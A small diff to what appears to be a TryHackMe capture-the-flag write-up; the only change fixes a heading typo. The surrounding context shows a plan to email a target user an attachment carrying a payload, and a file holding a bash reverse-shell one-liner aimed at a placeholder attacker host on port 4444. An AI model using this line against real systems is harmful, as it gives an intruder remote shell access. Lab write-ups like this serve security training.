@@ -108,7 +108,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.58 seconds
 ```
 here we can send mail to Hakanbey with application attached, and let's send it with our payload inside.
 ```
-## Creat our payload
+## Create our payload
 ```
 root@ubuntu:~/THM/uranum# cat application
 bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
